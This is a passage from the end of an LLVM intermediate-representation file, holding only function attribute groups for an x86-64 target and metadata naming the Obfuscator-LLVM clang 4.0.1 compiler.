attributes #0 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #5 = { argmemonly nounwind }
attributes #6 = { nounwind }
attributes #7 = { nounwind readnone }
attributes #8 = { noreturn nounwind }

!llvm.ident = !{!0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
!1 = !{i32 -2146816763}
!2 = !{i32 -2146816354}
